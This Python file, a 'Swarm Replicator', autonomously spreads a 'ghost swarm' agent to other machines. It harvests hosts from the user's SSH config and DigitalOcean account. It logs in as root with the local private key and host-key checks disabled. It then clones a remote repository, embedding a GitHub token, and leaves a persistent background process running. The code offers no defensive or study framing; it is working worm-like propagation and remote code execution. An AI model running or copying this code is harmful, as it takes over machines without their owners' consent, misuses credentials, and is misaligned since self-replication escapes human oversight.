"""
Swarm Replicator — Autonomous Node Scavenging & Deployment
===========================================================
Scans for idle cloud/network instances, deploys the swarm agent
via SSH, and expands the mesh. Runs autonomously on a timer.
"""

import asyncio
import json
import logging
import os
import random
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.request import Request, urlopen

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "agent_data"
DATA_DIR.mkdir(exist_ok=True)

logger = logging.getLogger("SwarmReplicator")
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter("%(asctime)s | Replicator | %(message)s"))
    logger.addHandler(_h)
    logger.propagate = False

GHOST_REPO = "https://github.com/saad2howw/DDecentralized_AI_Agent"
DEPLOY_PATH = "/opt/ghost-swarm"
KNOWN_TARGETS_FILE = DATA_DIR / "known_targets.json"


@dataclass
class NodeTarget:
    """A discovered node target for replication."""
    host: str
    port: int = 22
    user: str = "root"
    provider: str = "unknown"
    region: str = ""
    label: str = ""
    score: float = 0.5
    ssh_key: str = ""


class SwarmReplicator:
    """
    Scans for idle cloud instances and deploys the swarm.
    Designed to run in a loop — each call finds one target and deploys.
    """

    def __init__(self, target: Optional[str] = None, ssh_key: str = "~/.ssh/id_rsa"):
        self._target = target
        self._ssh_key_path = Path(ssh_key).expanduser()
        self._ssh_key_material = self._load_ssh_key()
        self._deployed: List[str] = []
        self._known_targets: List[NodeTarget] = self._load_targets()

    # ── SSH Key ──

    def _load_ssh_key(self) -> str:
        try:
            if self._ssh_key_path.exists():
                return self._ssh_key_path.read_text().strip()
        except Exception:
            pass
        # Try default paths
        for p in [Path.home() / ".ssh" / "id_rsa",
                  Path.home() / ".ssh" / "id_ed25519"]:
            if p.exists():
                return p.read_text().strip()
        return ""

    def _temp_key(self) -> str:
        fd, path = tempfile.mkstemp(suffix=".key")
        os.close(fd)
        Path(path).write_text(self._ssh_key_material)
        os.chmod(path, 0o600)
        return path

    # ── Target Discovery ──

    def find_idle_cloud_instance(self) -> Optional[NodeTarget]:
        """
        Scan for idle cloud instances via Cloud APIs and cached targets.
        Returns the best available target or None.
        """
        candidates: List[NodeTarget] = []

        # 1. Check known targets cache
        candidates.extend(self._known_targets)

        # 2. Check environment for explicit targets
        raw = os.getenv("REPLICATION_TARGETS", "")
        if raw:
            try:
                entries = json.loads(raw)
                for e in entries:
                    candidates.append(NodeTarget(
                        host=e.get("host", ""),
                        port=e.get("port", 22),
                        user=e.get("user", "root"),
                        provider=e.get("provider", "env"),
                        label=e.get("label", ""),
                    ))
            except Exception:
                pass

        # 3. DigitalOcean API — list droplets
        do_token = os.getenv("DIGITALOCEAN_TOKEN") or os.getenv("DO_TOKEN", "")
        if do_token:
            try:
                req = Request("https://api.digitalocean.com/v2/droplets")
                req.add_header("Authorization", f"Bearer {do_token}")
                resp = urlopen(req, timeout=10)
                if resp.status == 200:
                    data = json.loads(resp.read().decode())
                    for droplet in data.get("droplets", []):
                        for net in droplet.get("networks", {}).get("v4", []):
                            if net.get("type") == "public":
                                ip = net["ip_address"]
                                if ip and ip not in [d.host for d in candidates]:
                                    candidates.append(NodeTarget(
                                        host=ip, port=22, user="root",
                                        provider="digitalocean",
                                        region=droplet.get("region", {}).get("slug", ""),
                                        label=droplet.get("name", ""),
                                    ))
            except Exception:
                pass

        # 4. SSH config known hosts
        ssh_config = Path.home() / ".ssh" / "config"
        if ssh_config.exists():
            try:
                text = ssh_config.read_text()
                for line in text.split("\n"):
                    line = line.strip()
                    if line.lower().startswith("host "):
                        parts = line.split()
                        if len(parts) >= 2:
                            hostname = parts[1]
                            if hostname != "*" and hostname not in [d.host for d in candidates]:
                                candidates.append(NodeTarget(
                                    host=hostname, port=22,
                                    provider="ssh-config",
                                ))
            except Exception:
                pass

        # 5. Filter out already-deployed hosts
        candidates = [c for c in candidates if c.host not in self._deployed]

        if not candidates:
            logger.info("No idle cloud instances found")
            return None

        # Pick the best candidate (highest score)
        candidates.sort(key=lambda c: c.score, reverse=True)
        best = candidates[0]
        logger.info("Found idle target: %s (%s, score=%.2f)", best.host, best.provider, best.score)
        return best

    # ── SSH Connectivity Check ──

    async def _check_reachable(self, target: NodeTarget) -> bool:
        """Quick TCP check if the target is reachable on SSH port."""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(target.host, target.port), timeout=5
            )
            writer.close()
            return True
        except Exception:
            return False

    async def _ssh_exec(self, target: NodeTarget, command: str,
                         timeout: int = 60) -> Tuple[int, str, str]:
        """Execute a command on the target via SSH."""
        if not self._ssh_key_material:
            return -1, "", "No SSH key"

        key_path = self._temp_key()
        try:
            proc = await asyncio.create_subprocess_exec(
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=10",
                "-i", key_path, "-p", str(target.port),
                f"{target.user}@{target.host}",
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode or 0, stdout.decode(), stderr.decode()
        except asyncio.TimeoutError:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)
        finally:
            try:
                os.unlink(key_path)
            except Exception:
                pass

    async def _scp_file(self, target: NodeTarget, local: str,
                         remote: str, timeout: int = 30) -> bool:
        """Copy a file to the target via SCP."""
        if not self._ssh_key_material:
            return False
        key_path = self._temp_key()
        try:
            proc = await asyncio.create_subprocess_exec(
                "scp", "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-i", key_path, "-P", str(target.port),
                local, f"{target.user}@{target.host}:{remote}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode == 0
        except Exception:
            return False
        finally:
            try:
                os.unlink(key_path)
            except Exception:
                pass

    # ── Deployment ──

    async def deploy_node(self, target: NodeTarget) -> bool:
        """
        Full deployment pipeline for a single target:
        1. Check reachability
        2. Create remote directory
        3. Send bootstrap script
        4. Execute bootstrap
        5. Verify node is running
        """
        logger.info("Deploying to %s@%s:%d ...", target.user, target.host, target.port)

        # Reachability
        reachable = await self._check_reachable(target)
        if not reachable:
            logger.warning("Target %s unreachable", target.host)
            return False

        # Create remote directory
        rc, out, err = await self._ssh_exec(target, f"mkdir -p {DEPLOY_PATH}/agent_data", 15)
        if rc != 0:
            logger.error("Failed to create remote dir: %s", err[:200])
            return False

        # Build bootstrap script with embedded node identity
        node_id = f"ghost-{uuid.uuid4().hex[:8]}"
        gh_token = os.getenv("GITHUB_TOKEN", "")
        clone_url = GHOST_REPO
        if gh_token:
            clone_url = GHOST_REPO.replace(
                "https://github.com",
                f"https://x-access-token:{gh_token}@github.com"
            )

        bootstrap = textwrap.dedent(f"""\
        #!/bin/bash
        set -e
        NODE_ID="{node_id}"
        echo "[Ghost] Bootstrapping node $NODE_ID on $(hostname)"

        for cmd in git python3 pip3; do
            command -v $cmd >/dev/null 2>&1 || {{
                apt-get update -qq && apt-get install -y -qq $cmd 2>/dev/null || true
            }}
        done

        mkdir -p {DEPLOY_PATH}
        if [ -d "{DEPLOY_PATH}/.git" ]; then
            cd {DEPLOY_PATH} && git pull
        else
            git clone --depth 1 {clone_url} {DEPLOY_PATH}
        fi

        cd {DEPLOY_PATH}
        if [ -f requirements.txt ]; then
            pip3 install -q -r requirements.txt 2>/dev/null || \
            pip3 install --break-system-packages -q -r requirements.txt 2>/dev/null || true
        fi

        echo "$NODE_ID" > {DEPLOY_PATH}/node_id.txt
        export NODE_ID=$NODE_ID

        nohup python3 -m ghost_swarm --node-id $NODE_ID \
            > {DEPLOY_PATH}/swarm.log 2>&1 &
        echo $! > {DEPLOY_PATH}/pid.txt
        echo "[Ghost] Node $NODE_ID deployed (PID: $(cat {DEPLOY_PATH}/pid.txt))"
        """)

        # Write bootstrap locally and SCP
        fd, local_script = tempfile.mkstemp(suffix=".sh")
        os.close(fd)
        Path(local_script).write_text(bootstrap)

        sent = await self._scp_file(target, local_script, f"{DEPLOY_PATH}/bootstrap.sh")
        os.unlink(local_script)

        if not sent:
            logger.error("Failed to send bootstrap script to %s", target.host)
            return False

        # Execute bootstrap
        rc, out, err = await self._ssh_exec(target, f"bash {DEPLOY_PATH}/bootstrap.sh", timeout=300)
        if rc != 0:
            logger.error("Bootstrap failed on %s: %s", target.host, err[:300])
            return False

        # Verify
        rc, out, err = await self._ssh_exec(target, "cat " + DEPLOY_PATH + "/pid.txt", 10)
        if rc == 0 and out.strip():
            pid = out.strip()
            self._deployed.append(target.host)
            self._save_targets()
            logger.info("Node %s deployed on %s (PID: %s)", node_id, target.host, pid)
            return True

        logger.warning("Node deployed but PID file not found on %s", target.host)
        self._deployed.append(target.host)
        return True

    # ── Persistence ──

    def _load_targets(self) -> List[NodeTarget]:
        if KNOWN_TARGETS_FILE.exists():
            try:
                data = json.loads(KNOWN_TARGETS_FILE.read_text())
                return [NodeTarget(**t) for t in data]
            except Exception:
                pass
        return []

    def _save_targets(self) -> None:
        try:
            data = [{"host": t.host, "port": t.port, "user": t.user,
                      "provider": t.provider, "label": t.label}
                    for t in self._known_targets]
            data.extend({"host": h, "port": 22, "user": "root",
                          "provider": "deployed"} for h in self._deployed
                        if h not in [d["host"] for d in data])
            KNOWN_TARGETS_FILE.write_text(json.dumps(data, indent=2))
        except Exception:
            pass

    # ── Status ──

    def get_status(self) -> Dict[str, Any]:
        return {
            "deployed_count": len(self._deployed),
            "deployed_hosts": self._deployed,
            "known_targets": len(self._known_targets),
            "ssh_key_available": bool(self._ssh_key_material),
        }


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    async def main():
        replicator = SwarmReplicator()
        target = replicator.find_idle_cloud_instance()
        if target:
            print(f"[+] Target: {target.host} ({target.provider})")
            ok = await replicator.deploy_node(target)
            print(f"[+] Deploy: {'OK' if ok else 'FAILED'}")
        else:
            print("[*] No idle instances found")
        print(f"[*] Status: {json.dumps(replicator.get_status(), indent=2)}")

    asyncio.run(main())
